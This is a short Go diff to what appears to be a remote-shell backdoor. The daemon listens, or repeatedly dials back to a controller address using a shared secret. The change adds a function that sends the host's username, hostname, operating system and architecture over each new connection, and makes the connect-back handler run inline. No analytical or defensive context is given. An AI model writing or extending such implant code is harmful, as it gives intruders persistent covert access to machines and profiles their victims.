@@ -6,7 +6,9 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"os/user"
 	"path/filepath"
+	"runtime"
 	"syscall"
 	"time"
 
@@ -65,6 +67,7 @@ func StartDaemon(host string, port int, secret string, delay int) {
 		for {
 			layer, err := ln.Accept()
 			if err == nil {
+				sendMetadata(layer)
 				go handleGeneric(layer)
 			}
 		}
@@ -74,11 +77,26 @@ func StartDaemon(host string, port int, secret string, delay int) {
 		for {
 			layer, err := pel.Dial(addr, secret, true)
 			if err == nil {
-				go handleGeneric(layer)
+				sendMetadata(layer)
+				handleGeneric(layer)
 			}
 			time.Sleep(time.Duration(delay) * time.Second)
 		}
 	}
+}
+
+func sendMetadata(layer *pel.PktEncLayer) {
+	u, err := user.Current()
+	username := "?"
+	if err == nil {
+		username = u.Username
+	}
+	hostname, _ := os.Hostname()
+	if hostname == "" {
+		hostname = "?"
+	}
+	meta := fmt.Sprintf("%s@%s|%s/%s", username, hostname, runtime.GOOS, runtime.GOARCH)
+	layer.Write([]byte(meta))
 }
 
 // entry handler,
